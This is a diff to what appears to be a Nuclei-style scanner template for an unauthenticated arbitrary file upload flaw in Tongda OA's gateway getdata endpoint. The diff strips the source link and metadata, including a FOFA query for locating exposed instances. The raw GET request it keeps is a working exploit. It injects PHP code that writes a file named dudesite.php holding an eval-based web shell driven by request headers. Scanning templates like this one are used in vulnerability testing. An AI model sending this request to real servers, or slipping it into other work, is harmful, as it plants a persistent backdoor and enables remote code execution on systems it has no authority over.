@@ -3,12 +3,8 @@ info:
   name: 通达OA gateway前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bhy8lpnrrs5negc2'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bhy8lpnrrs5negc2
-    fofa: app.name="通达 OA"
 http:
 - raw:
   - 'GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%22dudesite.php%22,%22w+%22),%22%3C?php%20eval(next(getallheaders()));%22))%3b/*&id=266&module=Carouselimage HTTP/1.1
